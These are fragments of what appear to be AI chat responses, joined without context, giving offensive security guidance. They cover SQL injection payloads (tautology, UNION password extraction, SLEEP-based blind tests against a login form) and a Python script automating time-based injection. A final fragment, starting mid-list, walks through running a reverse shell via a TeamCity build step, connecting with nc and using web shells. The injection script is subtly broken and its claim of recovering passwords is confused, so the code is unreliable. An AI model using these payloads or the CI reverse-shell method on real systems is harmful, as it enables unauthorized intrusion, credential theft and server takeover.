				"content": " SQL Injection (SQLi) is a code injection technique used by attackers to manipulate and extract data from databases through the application layer, often due to insufficient input validation. There are three main types of SQL Injections:\n\n1. **Classic SQL Injection:** This type occurs when an attacker can insert arbitrary SQL code into a query and execute it. To test for classic SQL injection, follow these steps:\n\n   - Identify input fields that may be vulnerable to SQL injection by looking for parameters in URLs or forms, such as login credentials or search queries.\n   - Use single quotes (') or double quotes (\"\") to see if the application is properly escaping user inputs. If the application returns an error, it might indicate that the input is not being handled correctly and could be vulnerable.\n   - Inject common SQL injection payloads like `1' OR 1=1 --` to bypass any logic in the query and check for true statements.\n   - Test for data extraction by using the UNION operator to combine the results of two SELECT statements. For example, `username' UNION SELECT password FROM users WHERE id = 1 --`.\n\n2. **Blind SQL Injection:** This type does not return any sensitive information directly but can still be used for malicious purposes, such as account takeover or server manipulation. To test for blind SQL injection:\n\n   - Identify input fields that may be vulnerable to SQL injection.\n   - Use time-based (error-based) or boolean-based techniques to detect the presence of SQL injection.\n   - For time-based techniques, send multiple queries with different conditions and observe the response times. If there's a delay in the response for certain conditions, it might indicate that SQL injection is present.\n   - For boolean-based techniques, use true (1) or false (0) values to check if the application behaves differently based on the result of the SQL query.\n   - Use tools like sqlmap or Burp Suite to automate the process and speed up the testing.\n\n3. **Stored Procedure Injection:** This type occurs when an attacker can manipulate stored procedures by injecting malicious code into their input parameters. To test for stored procedure injection:\n\n   - Identify if the application uses stored procedures by looking at the source code or network traffic.\n   - Use single quotes (') or double quotes (\"\") to see if the application is properly escaping user inputs in stored procedures. If it's not, it might be vulnerable.\n   - Inject common SQL injection payloads like `1' OR 1=1; EXEC sp_help --` to check for stored procedure injection.\n   - Test for data extraction by using UNION or other techniques, but adapt them to work within the context of stored procedures.\n\nAlways remember that ethical hacking involves responsible disclosure and adherence to local laws and regulations. Never attempt to exploit vulnerabilities without proper authorization or for malicious purposes."

				"content": " The provided code snippet is a JavaScript function that handles the login form submission for an application. It performs some basic input validation by checking for certain keywords in the `username` parameter, but it seems to be missing proper sanitization for the `password` parameter.\n\nSince the sanitization only happens on the username parameter and not the password, this could potentially make the login function vulnerable to Blind SQL Injection attacks if an attacker can manipulate the password input.\n\nTo test for a Blind SQL Injection in this scenario, you can use time-based or boolean-based techniques as follows:\n\n1. Time-Based Technique:\n   - Send multiple login attempts with different conditions in the password parameter and measure the response times. For example:\n     - Password: `' OR SLEEP(5) --`: This will cause a delay of 5 seconds in the response if SQL injection is present.\n     - Password: `' OR SLEEP(0) --`: This should return an immediate response if SQL injection is not present.\n   - Compare the response times to determine if there's any difference, which could indicate the presence of SQL injection.\n\n2. Boolean-Based Technique:\n   - Send multiple login attempts with different conditions in the password parameter and observe the application's behavior based on the result of the SQL query. For example:\n     - Password: `' OR 1=1 --`: If this login attempt is successful, it might indicate that SQL injection is present.\n     - Password: `' OR 1=2 --`: This should not be successful if SQL injection is present.\n   - Compare the results to determine if there's any difference, which could indicate the presence of SQL injection."

Here's an example of a simple Python script for this purpose:\n\n```python\nimport requests\nimport time\n\nurl = 'http://your_application_url/functions.php'\nusername = \"somemail@gmail.com\"\npasswords = [\"123456\", \"abcdefg\", \"qwerty\", \"password\"]\n\nfor password in passwords:\n    payload = f\"username={username}' RLIKE SLEEP({int(time.time() * 1000)})-- zljr&password={password}&function=login\"\n    response = requests.post(url, data={\"username\": payload, \"password\": \"\", \"function\": \"login\"})\n    time_taken = int(response.elapsed.total_seconds() * 1000)\n    print(f\"Password: {password}, Time taken: {time_taken}\")\n```\n\nThis script sends multiple login attempts with different passwords and records the response times for each request. The `SLEEP(int(time.time() * 1000))` payload causes a delay in the response, which can be used to measure the time taken for each request. By comparing the response times for different passwords, you may find patterns that could help you determine the correct password or gain more information about the database structure.\n\nRemember to replace `'your_application_url'` with the actual URL of your target application and run this script responsibly, following all ethical hacking guidelines and local laws."

Upload the `reverse_shell.py` script to your TeamCity server, for example in the `/tmp` directory.\n\n3. Create a new Python build step in your TeamCity project with the following settings:\n   - Runner Type: Python\n   - Command: `python /tmp/reverse_shell.py` (Replace the path accordingly if you uploaded the script elsewhere)\n   - Test Reporting and Code Coverage are optional, you can leave them unchecked.\n\n4. Start the build to start the reverse shell listener on port 1234.\n\n5. From your attacker machine, use a tool like `nc` or `netcat` to connect to the TeamCity server on port 1234:\n\n```bash\nnc <TeamCityServerIP> 1234\n```\n\nNow you have a reverse shell and can execute commands on the TeamCity server.\n\nAlternatively, you could also use a web shell like `php-reverse-shell` or `pywpshell` to create a web interface for executing system commands through your browser by connecting to the TeamCity server.\n\nFor more information about using web shells in CTF challenges, check out this article: https://www.hackingarticles.in/web-shells-ctf/"
